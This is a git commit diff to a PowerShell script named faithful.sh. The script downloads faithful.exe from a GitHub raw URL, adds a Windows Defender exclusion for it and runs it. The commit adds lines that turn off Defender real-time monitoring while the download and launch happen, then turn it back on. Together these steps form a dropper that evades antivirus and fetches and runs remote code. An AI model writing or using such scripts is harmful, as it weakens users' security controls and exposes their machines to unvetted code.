452c54e06ffdeeaade05e10cd8a4bc64dee5ffaa
thaddeuskkr <thaddeuskkr@gmail.com>
2022-04-11 17:43:55 +0800

    admin

--- faithful.sh
+++ faithful.sh
@@ -19,9 +19,12 @@ if (!
     exit
 }
 
+cd $env:userprofile
+Set-MpPreference -DisableRealtimeMonitoring $true
 Write-Output "Starting script..."
 Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
 Write-Output "Adding Windows Defender exclusion..."
 Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
 Start-Process ("faithful.exe")
+Set-MpPreference -DisableRealtimeMonitoring $false
 Write-Output "Done!"
